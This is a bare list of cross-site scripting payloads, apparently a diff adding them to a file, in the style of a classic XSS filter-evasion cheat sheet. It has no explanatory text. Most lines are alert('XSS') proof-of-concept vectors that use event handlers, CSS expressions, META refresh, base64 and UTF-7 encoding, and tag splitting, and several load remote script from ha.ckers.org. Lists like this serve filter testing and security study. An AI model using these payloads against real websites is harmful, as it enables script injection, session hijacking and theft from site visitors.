+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT>a=/XSS/
+\";alert('XSS');//
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+getURL("javascript:alert('XSS')")
+a="get";
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<HTML><BODY>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
